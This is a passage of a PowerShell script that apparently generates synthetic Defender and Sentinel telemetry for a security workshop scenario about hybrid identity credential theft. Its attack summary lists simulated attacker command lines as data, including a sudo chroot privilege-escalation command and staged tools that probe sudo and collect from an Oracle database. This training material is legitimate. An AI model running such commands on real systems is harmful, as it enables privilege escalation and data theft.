    [pscustomobject]@{ Id = 'igid-scenario-tls'; Field = 'TlsServer12'; Description = 'TLS configuration state relevant to server hardening review during post-incident remediation.'; Categories = @('network protocol', 'tls', 'hardening'); DataStructure = 'String or null' }
)
foreach ($kb in $scenarioInfoGatheringKb) {
    Add-Record -Table 'DeviceTvmInfoGatheringKB' -Time $StartTime.AddMinutes(14) -Values @{
        IgId = $kb.Id
        FieldName = $kb.Field
        Description = $kb.Description
        Categories = [object[]]$kb.Categories
        DataStructure = $kb.DataStructure
        TenantId = ''
        Type = 'DeviceTvmInfoGatheringKB'
        SourceSystem = ''
    }
}

$scenarioHardwareFirmware = @(
    [pscustomobject]@{ Device = $win04; Type = 'Tpm'; Manufacturer = 'microsoft'; Name = 'trusted_platform_module'; Family = 'TPM'; Version = '2.0'; Additional = @{ SecureBoot = 'Enabled'; VirtualizationBasedSecurity = 'NotEnabled'; CredentialGuardCapable = $true; Scenario = 'Patient-zero workstation hardening context' } },
    [pscustomobject]@{ Device = $aadc; Type = 'Bios'; Manufacturer = 'microsoft'; Name = 'virtual_machine_firmware'; Family = 'Virtual Machine'; Version = '4.1.0.0'; Additional = @{ SecureBoot = 'Enabled'; Tier = 'Identity Tier 0'; BIOSReleaseDate = Format-WorkshopTime $StartTime.AddDays(-180); Scenario = 'Hybrid identity synchronization server' } },
    [pscustomobject]@{ Device = $linux03; Type = 'Bios'; Manufacturer = 'microsoft'; Name = 'hyper-v_uefi'; Family = 'Virtual Machine'; Version = '4.1.0.0'; Additional = @{ SecureBoot = 'Enabled'; Kernel = '6.8.0-58-generic'; Scenario = 'Ubuntu MDE sensor host' } }
)
foreach ($component in $scenarioHardwareFirmware) {
    Add-Record -Table 'DeviceTvmHardwareFirmware' -Time $StartTime.AddMinutes(15) -Values @{
        DeviceId = $component.Device.DeviceId
        DeviceName = $component.Device.Name
        ComponentType = $component.Type
        Manufacturer = $component.Manufacturer
        ComponentName = $component.Name
        ComponentFamily = $component.Family
        ComponentVersion = $component.Version
        AdditionalFields = $component.Additional
        TenantId = ''
        Type = 'DeviceTvmHardwareFirmware'
        SourceSystem = ''
        MachineGroup = Get-WorkshopScenarioMachineGroup -Device $component.Device
    }
}

$scenarioCertificates = @(
    [pscustomobject]@{ Device = $win04; FriendlyName = 'USAG Cyber Workstation Client Authentication Certificate'; Subject = @{ CommonName = $win04.Name; Organization = 'USAG Cyber'; OrganizationalUnit = 'Workstations' }; Eku = @('Client Authentication', 'Smart Card Logon'); Days = 280 },
    [pscustomobject]@{ Device = $aadc; FriendlyName = 'USAG Cyber Entra Connect Sync Client Authentication Certificate'; Subject = @{ CommonName = $aadc.Name; Organization = 'USAG Cyber'; OrganizationalUnit = 'Identity Tier 0' }; Eku = @('Client Authentication', 'Server Authentication'); Days = 75 },
    [pscustomobject]@{ Device = $linuxDb; FriendlyName = 'USAG Cyber Oracle Listener Server Certificate'; Subject = @{ CommonName = $linuxDb.Name; Organization = 'USAG Cyber'; OrganizationalUnit = 'Database Services' }; Eku = @('Server Authentication', 'Client Authentication'); Days = 42 }
)
foreach ($certificate in $scenarioCertificates) {
    Add-Record -Table 'DeviceTvmCertificateInfo' -Time $StartTime.AddMinutes(15) -Values @{
        DeviceId = $certificate.Device.DeviceId
        Thumbprint = (New-StableHex "scenario-certificate|$($certificate.Device.DeviceId)" 40).ToUpperInvariant()
        Path = if ($certificate.Device.OS -eq 'Ubuntu') { "/etc/ssl/certs/$($certificate.Device.ShortName.ToLowerInvariant()).pem" } else { "Microsoft.PowerShell.Security\Certificate::LocalMachine\My\$((New-StableHex "scenario-certificate|$($certificate.Device.DeviceId)" 40).ToUpperInvariant())" }
        SerialNumber = (New-StableHex "scenario-certificate-serial|$($certificate.Device.DeviceId)" 32).ToUpperInvariant()
        IssuedTo = $certificate.Subject
        IssuedBy = @{ CommonName = 'USAG Cyber Root CA'; Organization = 'USAG Cyber'; CountryName = 'US' }
        FriendlyName = $certificate.FriendlyName
        SignatureAlgorithm = 'sha256RSA'
        KeySize = 4096
        ExpirationDate = Format-WorkshopTime $StartTime.AddDays($certificate.Days)
        IssueDate = Format-WorkshopTime $StartTime.AddDays(-365)
        SubjectType = 'End Entity'
        KeyUsage = [object[]]@('Digital Signature', 'Key Encipherment')
        ExtendedKeyUsage = [object[]]$certificate.Eku
        TenantId = ''
        Type = 'DeviceTvmCertificateInfo'
        SourceSystem = ''
        MachineGroup = Get-WorkshopScenarioMachineGroup -Device $certificate.Device
    }
}

$scenarioSecureConfigurations = @(
    [pscustomobject]@{ Device = $win04; Id = 'scid-91'; Category = 'Security controls'; Subcategory = 'Attack Surface Reduction'; Impact = 8.5; Compliant = $false; Context = @(@{ Rule = 'Block credential stealing from LSASS'; State = 'Audit' }, @{ Rule = 'Block Office child process creation'; State = 'Warn' }) },
    [pscustomobject]@{ Device = $win04; Id = 'scid-2011'; Category = 'OS'; Subcategory = 'Credential Guard'; Impact = 9.0; Compliant = $false; Context = @(@{ Setting = 'CredentialGuard'; State = 'Disabled' }, @{ Setting = 'LSAProtection'; State = 'Disabled' }) },
    [pscustomobject]@{ Device = $aadc; Id = 'scid-5002'; Category = 'Accounts'; Subcategory = 'Service account interactive logon'; Impact = 9.5; Compliant = $false; Context = @(@{ Account = 'svc_sql'; Observation = 'RemoteInteractive logon to identity synchronization server' }, @{ SourceDevice = $win04.Name; TargetDevice = $aadc.Name }) },
    [pscustomobject]@{ Device = $linux03; Id = 'scid-linux-ssh-01'; Category = 'OS'; Subcategory = 'OpenSSH hardening'; Impact = 7.0; Compliant = $false; Context = @(@{ Setting = 'PasswordAuthentication'; State = 'Enabled' }, @{ Setting = 'PermitRootLogin'; State = 'prohibit-password' }) }
)
foreach ($configuration in $scenarioSecureConfigurations) {
    Add-Record -Table 'DeviceTvmSecureConfigurationAssessment' -Time $StartTime.AddMinutes(16) -Values @{
        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(16)
        DeviceId = $configuration.Device.DeviceId
        DeviceName = $configuration.Device.Name
        OSPlatform = if ($configuration.Device.OS -eq 'Ubuntu') { 'Ubuntu' } else { $configuration.Device.OS }
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes(16)
        ConfigurationId = $configuration.Id
        ConfigurationCategory = $configuration.Category
        ConfigurationSubcategory = $configuration.Subcategory
        ConfigurationImpact = $configuration.Impact
        IsCompliant = $configuration.Compliant
        IsApplicable = $true
        Context = [object[]]$configuration.Context
        IsExpectedUserImpact = $true
        TenantId = ''
        Type = 'DeviceTvmSecureConfigurationAssessment'
        SourceSystem = ''
        MachineGroup = Get-WorkshopScenarioMachineGroup -Device $configuration.Device
    }
}

Add-WorkshopScenarioSecurityIncident `
    -IncidentNumber 3001 `
    -ProviderIncidentId '3001' `
    -TimeGenerated $StartTime.AddMinutes(83) `
    -FirstActivityTime $StartTime `
    -LastActivityTime $StartTime.AddMinutes(82) `
    -Title 'Multi-stage incident involving identity and endpoint activity' `
    -Description 'Correlates risky user sign-in, OAuth application consent, service-principal credential creation, Graph access, endpoint credential material collection, Kerberoasting, and service-account use against the identity synchronization server.' `
    -Severity 'High' `
    -Status 'Active' `
    -AlertIds @(
        $scenarioAlertIds.OAuthPersistence,
        $scenarioAlertIds.PowerShellCredentialDiscovery,
        $scenarioAlertIds.Kerberoasting,
        $scenarioAlertIds.LsassDump,
        $scenarioAlertIds.PasswordStoreHarvesting,
        $scenarioAlertIds.CredentialDumpingTool,
        $scenarioAlertIds.CorrelationOAuthGraph,
        $scenarioAlertIds.CorrelationCredentialCollection,
        $scenarioAlertIds.CorrelationHybridIdentity
    ) `
    -Tactics @('InitialAccess', 'Persistence', 'CredentialAccess', 'LateralMovement') `
    -Techniques @('T1078', 'T1528', 'T1098.001', 'T1550.001', 'T1003.001', 'T1558.003', 'T1021.006') `
    -Entities @{ user = $victor.Upn; primaryDevice = $win04.Name; servicePrincipal = 'USAG Cyber Sync Helper'; serviceAccount = $svcSql.Upn; targetDevice = $aadc.Name; sourceIp = $externalIp } `
    -TvmTables @('DeviceTvmSoftwareVulnerabilities', 'DeviceTvmSoftwareInventory', 'DeviceTvmInfoGatheringKB', 'DeviceTvmHardwareFirmware', 'DeviceTvmSoftwareEvidenceBeta', 'DeviceTvmSoftwareVulnerabilitiesKB', 'DeviceTvmCertificateInfo', 'DeviceTvmSecureConfigurationAssessment')

Add-WorkshopScenarioSecurityIncident `
    -IncidentNumber 3002 `
    -ProviderIncidentId '3002' `
    -TimeGenerated $StartTime.AddMinutes(12) `
    -FirstActivityTime $StartTime `
    -LastActivityTime $StartTime.AddMinutes(12) `
    -Title 'Authentication Attempt from New Country involving one user' `
    -Description 'Risky interactive sign-in from an unfamiliar location is followed by user-consented application access and Microsoft Graph activity.' `
    -Severity 'Medium' `
    -Status 'New' `
    -AlertIds @($scenarioAlertIds.OAuthPersistence, $scenarioAlertIds.CorrelationOAuthGraph) `
    -Tactics @('InitialAccess', 'Persistence') `
    -Techniques @('T1078', 'T1528', 'T1098.001') `
    -Entities @{ user = $victor.Upn; sourceIp = $externalIp; application = 'USAG Cyber Sync Helper'; appId = $maliciousOAuthAppId } `
    -TvmTables @('DeviceTvmInfoGatheringKB', 'DeviceTvmSecureConfigurationAssessment')

Add-WorkshopScenarioSecurityIncident `
    -IncidentNumber 3003 `
    -ProviderIncidentId '3003' `
    -TimeGenerated $StartTime.AddMinutes(76) `
    -FirstActivityTime $StartTime.AddMinutes(15) `
    -LastActivityTime $StartTime.AddMinutes(74) `
    -Title 'Suspicious activity involving Microsoft Defender XDR alert correlation' `
    -Description 'Defender XDR alert evidence correlates endpoint credential collection artifacts with service-account misuse and exposed software/configuration context.' `
    -Severity 'High' `
    -Status 'Active' `
    -AlertIds @(
        $scenarioAlertIds.PowerShellCredentialDiscovery,
        $scenarioAlertIds.Kerberoasting,
        $scenarioAlertIds.LsassDump,
        $scenarioAlertIds.PasswordStoreHarvesting,
        $scenarioAlertIds.CredentialDumpingTool,
        $scenarioAlertIds.CorrelationCredentialCollection,
        $scenarioAlertIds.CorrelationHybridIdentity
    ) `
    -Tactics @('CredentialAccess', 'LateralMovement') `
    -Techniques @('T1003.001', 'T1552.002', 'T1555', 'T1558.003', 'T1021.006') `
    -Entities @{ user = $victor.Upn; primaryDevice = $win04.Name; serviceAccount = $svcSql.Upn; targetDevice = $aadc.Name; evidencePath = $stage } `
    -TvmTables @('DeviceTvmSoftwareVulnerabilities', 'DeviceTvmSoftwareInventory', 'DeviceTvmSoftwareEvidenceBeta', 'DeviceTvmSoftwareVulnerabilitiesKB', 'DeviceTvmCertificateInfo', 'DeviceTvmSecureConfigurationAssessment')

Add-WorkshopScenarioSecurityIncident `
    -IncidentNumber 3004 `
    -ProviderIncidentId '3004' `
    -TimeGenerated $StartTime.AddMinutes(75) `
    -FirstActivityTime $StartTime.AddMinutes(61) `
    -LastActivityTime $StartTime.AddMinutes(74) `
    -Title 'Linux privilege escalation and data access activity' `
    -Description 'Optional Linux branch incident correlating SSH/PAM activity, sudo privilege escalation, staged Python and Go tooling, Oracle TNS access, and vulnerable Ubuntu package context.' `
    -Severity 'High' `
    -Status 'New' `
    -AlertIds @($scenarioAlertIds.LinuxSudoChroot, $scenarioAlertIds.LinuxOracleCollection) `
    -Tactics @('PrivilegeEscalation', 'Execution', 'Collection') `
    -Techniques @('T1548.003', 'T1059.006', 'T1005') `
    -Entities @{ user = $alice.Upn; sourceDevice = $linux03.Name; targetDevice = $linuxDb.Name; database = 'Oracle ORCL'; sourceIp = '10.42.30.10' } `
    -TvmTables @('DeviceTvmSoftwareVulnerabilities', 'DeviceTvmSoftwareInventory', 'DeviceTvmHardwareFirmware', 'DeviceTvmSoftwareEvidenceBeta', 'DeviceTvmSoftwareVulnerabilitiesKB', 'DeviceTvmCertificateInfo', 'DeviceTvmSecureConfigurationAssessment')

Add-WorkshopAadUserRiskEvents -Identities $users -ScenarioSignInTime $signinTime -Count $AadUserRiskEventCount

foreach ($table in $script:Schemas.Keys) {
    if ($script:Records[$table].Count -gt 0) {
        continue
    }
    $fallbackTime = $StartTime.AddMinutes(-10)
    $fallbackValues = if ($table -in @(
            'AADManagedIdentitySignInLogs',
            'AADSpnSignInEventsBeta',
            'EntraIdSpnSignInEvents',
            'DeviceTvmCertificateInfo',
            'DeviceTvmHardwareFirmware',
            'DeviceTvmInfoGathering',
            'DeviceTvmInfoGatheringKB',
            'DeviceTvmSecureConfigurationAssessment',
            'DeviceTvmSoftwareEvidenceBeta',
            'DeviceTvmSoftwareInventory',
            'DeviceTvmSoftwareVulnerabilities',
            'DeviceTvmSoftwareVulnerabilitiesKB',
            'SecurityIncident'
        )) {
        New-NormalTelemetryValues -Table $table -Time $fallbackTime -Index ([Convert]::ToInt32((New-StableHex "$table|fallback" 7), 16))
    }
    else {
        @{
            Timestamp = Format-WorkshopTime $fallbackTime
            TimeGenerated = Format-WorkshopTime $fallbackTime
            DeviceId = $win04.DeviceId
            DeviceName = $win04.Name
            AccountName = $victor.Name
            AccountUpn = $victor.Upn
            AccountObjectId = $victor.ObjectId
            AccountDisplayName = $victor.DisplayName
            AccountDomain = $adDomain
            AADTenantId = $tenantId
            TenantId = $tenantId
            ActionType = 'WorkshopBaseline'
            Application = 'WorkshopBaseline'
            ReportId = 9900
            Type = $table
        }
    }
    Add-Record -Table $table -Time $fallbackTime -Values $fallbackValues
}

foreach ($table in ($tablesToWrite | Sort-Object)) {
    Write-WorkshopTableData -Table $table
}

$summary = [ordered]@{
    scenarioName = 'MIDNIGHT BLIZZARD hybrid identity credential access'
    startTime = Format-WorkshopTime $StartTime
    telemetryWindow = [ordered]@{
        endTime = Format-WorkshopTime $script:TelemetryEndTime
        lookbackDays = $NormalLookbackDays
        earliestNormalTime = Format-WorkshopTime $script:TelemetryEndTime.AddDays(-$NormalLookbackDays)
    }
    tenantDomain = $tenantDomain
    adDomain = $adDomain
    infrastructure = [ordered]@{
        domainControllers = 2
        windows11Endpoints = 10
        ubuntuEndpoints = 5
        entraConnectServers = 1
    }
    identities = [ordered]@{
        users = $SyntheticUserCount
        serviceAccounts = $SyntheticServiceAccountCount
    }
    compromisedUser = $victor.Upn
    initialDevice = $win04.Name
    identityAttackVectors = @(
        [ordered]@{ Title = 'Risky interactive Entra sign-in from unfamiliar infrastructure'; Technique = 'T1078.004,T1110.003,T1090.002'; Offset = 0; Command = 'SigninLogs high-risk interactive sign-in with MFA from 185.225.73.18' }
        [ordered]@{ Title = 'Suspicious OAuth consent grants mailbox and file scopes'; Technique = 'T1528,T1098.003,T1550.001'; Offset = 5; Command = 'CloudAppEvents OAuthAppConsentGranted for USAG Cyber Sync Helper with Mail.Read Files.Read.All offline_access' }
        [ordered]@{ Title = 'Service principal credential added for OAuth persistence'; Technique = 'T1098.001,T1550.001'; Offset = 6; Command = 'AuditLogs Add service principal credentials and AADServicePrincipalSignInLogs client-secret sign-in to Microsoft Graph' }
        [ordered]@{ Title = 'Graph API mailbox, file, and directory collection'; Technique = 'T1087.004,T1114.002,T1530'; Offset = 7; Command = 'GraphAPIAuditEvents and MicrosoftGraphActivityLogs read messages, OneDrive, users, and SharePoint content' }
    )
    attackVectors = $attackSteps | Select-Object Title, Technique, Offset, Command
    linuxAttackVectors = @(
        [ordered]@{ Title = 'Suspicious SSH attempts against Ubuntu server'; Technique = 'T1021.004'; Offset = 61; Command = 'sshd authentication activity in /var/log/auth.log' }
        [ordered]@{ Title = 'Suspicious sudo chroot usage on Ubuntu server'; Technique = 'T1548.003'; Offset = 65; Command = 'sudo -R /tmp/.cache/nss /bin/bash -p' }
        [ordered]@{ Title = 'Unix shell and auditd evidence on Ubuntu server'; Technique = 'T1059.004'; Offset = 68; Command = 'auditd process execution evidence for sudo and bash' }
        [ordered]@{ Title = 'Synthetic Python privilege-check helper on Ubuntu server'; Technique = 'T1059.006'; Offset = 70; Command = 'python3 /tmp/.cache/oracle_privcheck.py --check sudo-cve-2025-32463 --target oracle' }
        [ordered]@{ Title = 'Synthetic Go binary accesses Oracle database over TNS'; Technique = 'T1005'; Offset = 72; Command = '/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog' }
    )
}

$summary | ConvertTo-Json -Depth 10 | Set-Content -Path $SummaryPath -Encoding UTF8
